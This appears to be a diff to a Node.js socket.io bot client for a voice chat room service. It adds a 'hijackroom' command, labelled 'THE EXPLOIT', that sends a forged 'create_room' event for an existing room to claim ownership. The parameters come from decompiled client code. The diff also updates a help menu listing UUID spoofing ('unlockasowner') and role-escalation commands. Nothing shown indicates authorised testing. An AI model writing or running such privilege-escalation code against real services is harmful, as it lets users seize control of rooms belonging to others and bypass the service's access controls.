@@ -809,33 +809,40 @@ function startCommandInterface() {
             console.log(`Socket ID: ${socket.id}`);
             console.log(`Current room: ${currentRoomId}`);
             console.log(`${'='.repeat(80)}\n`);
-        } else if (cmd === 'createroom') {
-            // Try to create a room via REST API
+        } else if (cmd === 'hijackroom') {
+            // 🔥 THE EXPLOIT! Try to call create_room on EXISTING room to claim ownership!
             const timestamp = new Date().toLocaleTimeString();
             console.log(`\n${'='.repeat(80)}`);
-            console.log(`[${timestamp}] 🧪 TESTING: Create room via REST API`);
+            console.log(`[${timestamp}] 🔥 TESTING: Room Hijack via create_room Event`);
             console.log(`${'='.repeat(80)}`);
+            console.log(`⚠️  Attempting to claim ownership of current room!`);
+            console.log(`   Current room: ${currentRoomId}`);
+            console.log(`   Our UUID: ${UUID}\n`);
 
-            const roomData = {
-                topic: 'Test Room - Bot Created',
+            const createData = {
+                room: currentRoomId,
                 uuid: UUID,
-                pin_name: PIN_NAME,
-                avatar_id: AVATAR_ID
+                limit_speaker: 0  // From decompiled code
             };
 
-            console.log(`📤 Trying POST /v1/rooms`);
-            axios.post(`${API_URL}/v1/rooms`, roomData, {
-                headers: { 'Authorization': `Bearer ${TOKEN}` },
-                httpsAgent
-            }).then(resp => {
-                console.log(`✅ CREATE SUCCESS! Response:`);
-                console.log(JSON.stringify(resp.data, null, 2));
-                console.log(`\n🔍 Look for: owner_token, session_id, permissions, etc.`);
-                console.log(`${'='.repeat(80)}\n`);
-            }).catch(err => {
-                console.log(`❌ Create failed: ${err.response?.status} ${err.response?.statusText}`);
-                console.log(`   Message: ${err.message}`);
-                console.log(`   Response: ${JSON.stringify(err.response?.data)}`);
+            console.log(`📤 Sending 'create_room' event (pretending we created it):`);
+            console.log(`   ${JSON.stringify(createData, null, 2)}`);
+            console.log(`\n💡 Theory: Server might grant us owner permissions!`);
+
+            socket.emit('create_room', createData, (resp) => {
+                console.log(`\n📥 create_room Response:`);
+                console.log(`   ${resp ? JSON.stringify(resp, null, 2) : 'null/undefined'}`);
+
+                if (resp?.result === 200 || resp?.success) {
+                    console.log(`\n🎉🎉🎉 CREATE_ROOM ACCEPTED!`);
+                    console.log(`Server might think we're the owner now!`);
+                    console.log(`\n💡 Now try: unlockwatch 3`);
+                } else if (resp?.error) {
+                    console.log(`\n❌ Rejected: ${resp.error}`);
+                } else {
+                    console.log(`\n⚠️  No response - trying anyway...`);
+                    console.log(`💡 Try: unlockwatch 3 to see if it worked`);
+                }
                 console.log(`${'='.repeat(80)}\n`);
             });
         } else if (cmd === 'quit' || cmd === 'exit') {
@@ -963,16 +970,17 @@ function connectAndJoin(room, followUserUuid = null, followUserName = null) {
             console.log('Listening for new messages...\n');
             console.log('Commands:');
             console.log('  msg <text>    - Send message');
-            console.log('\n🔬 SECURITY TESTS:');
-            console.log('  showsession      - Show session info');
-            console.log('  unlockasowner <pos> - Test UUID spoofing (security test)');
-            console.log('\n⭐ PRIMARY TESTS:');
-            console.log('  unlockwatch <1-10>  - Unlock + watch for confirmation');
-            console.log('  lock/unlock <1-10>  - Basic lock/unlock');
+            console.log('\n🔥 THE EXPLOIT (Try this first in non-owner room!):');
+            console.log('  hijackroom          - Send create_room to claim ownership!');
+            console.log('  Then: unlockwatch 3 - Test if unlock now works');
+            console.log('\n🔬 Other Security Tests:');
+            console.log('  showsession / unlockasowner <pos>');
+            console.log('\n⭐ Unlock Tests:');
+            console.log('  unlockwatch <1-10>  - Unlock + watch speaker_changed');
+            console.log('  unlock <1-10>       - Basic unlock');
             console.log('\n🧪 Experimental:');
-            console.log('  unlockhost/unlockadmin/unlockroom <1-10>');
-            console.log('  joinspeaker/movespeaker/setrole/rejoinhost');
-            console.log('\nOther: createroom, mute, unmute, quit');
+            console.log('  setrole/rejoinhost/joinspeaker/movespeaker');
+            console.log('\nOther: lock, mute, unmute, quit');
             console.log();
 
             // Start command input handler
